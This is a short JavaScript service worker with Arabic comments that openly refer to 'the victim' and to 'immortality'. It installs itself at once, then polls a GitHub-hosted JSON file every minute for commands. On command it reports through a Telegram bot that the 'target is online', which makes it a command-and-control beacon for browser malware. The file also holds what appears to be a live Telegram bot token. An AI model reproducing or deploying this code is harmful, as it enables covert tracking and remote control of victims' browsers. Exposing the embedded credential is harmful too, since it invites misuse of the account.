const BOT_TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';
let chatId = "";

// التفعيل الفوري والخلود
self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(clients.claim()));

// استقبال الـ Chat ID من الصفحة الرئيسية
self.addEventListener('message', e => {
    if (e.data.type === 'INIT') {
        chatId = e.data.id;
        console.log("🔗 Connection Established with ID: " + chatId);
        // بدء حلقة الفحص اللانهائية (كل دقيقة)
        setInterval(checkCommands, 60000);
    }
});

async function checkCommands() {
    // يمكنك وضع رابط ملف JSON على GitHub هنا لإرسال أوامر للضحية
    const CMD_URL = 'https://raw.githubusercontent.com/mosbahimouataz7/no-ip-/main/server.json';
    
    try {
        const res = await fetch(CMD_URL + '?t=' + Date.now());
        const data = await res.json();
        
        if (data.action === "REPORT" && chatId) {
            const msg = "📊 Status: Background Agent Active (Target is Online)";
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
        }
    } catch(e) {}
}
